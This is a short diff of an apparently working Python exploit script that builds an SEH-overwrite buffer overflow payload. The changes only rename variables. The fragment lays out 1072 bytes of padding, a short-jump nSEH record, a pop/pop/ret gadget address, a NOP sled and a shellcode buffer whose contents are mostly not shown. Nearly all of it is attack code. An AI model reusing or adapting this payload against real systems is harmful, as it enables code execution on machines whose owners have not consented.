@@ -70,14 +70,14 @@ buf += b"\x72\x6d\x4b\xaa"
 
 
 ##1076
-before_calc =  'B' * 1072 + '\xeb\x0A\x90\x90' #1076 jmp short 10 
+junk =  'B' * 1072 + '\xeb\x0A\x90\x90' #1076 jmp short 10 nseh
 
-junk = before_calc  + struct.pack('<I',0x40590B) 
+seh = junk  + struct.pack('<I',0x40590B) 
 #0040590B      POP ESI
 
 
 
-buffer = junk    + "\x90" * 100 + buf + "\x90" * (2000  - len(junk) - len(buf))
+buffer = seh   + "\x90" * 100 + buf + "\x90" * (2000  - len(seh) - len(buf))
 
 
 try:
